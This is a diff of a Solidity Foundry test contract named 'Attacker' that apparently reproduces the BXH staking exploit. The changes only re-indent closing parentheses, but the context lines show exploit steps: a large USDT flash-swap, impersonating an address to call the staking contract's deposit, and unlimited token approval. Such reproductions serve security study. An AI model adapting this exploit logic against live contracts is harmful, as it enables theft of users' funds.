@@ -58,7 +58,7 @@ contract Attacker is Test {
             "[Start] BXH-USDT  Pair USDT Balance is :",
             usdt.balanceOf(address(0x919964B7f12A742E3D33176D7aF9094EA4152e6f)),
             18
-            );
+        );
         usdtwbnbpair.swap(3_178_800_000_000_000_000_000_000, 0, address(this), "0x");
 
         emit log_named_decimal_uint("[Over] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
@@ -84,7 +84,7 @@ contract Attacker is Test {
             "[Flashloan] now bxh contract USDT balance is :",
             usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)),
             18
-            );
+        );
 
         cheat.startPrank(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f);
         bxhtokenstaking.deposit(0, 0);
@@ -96,7 +96,7 @@ contract Attacker is Test {
             "[Flashloan] bxh contract USDT Balance is :",
             usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)),
             18
-            );
+        );
 
         BXH.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);
 
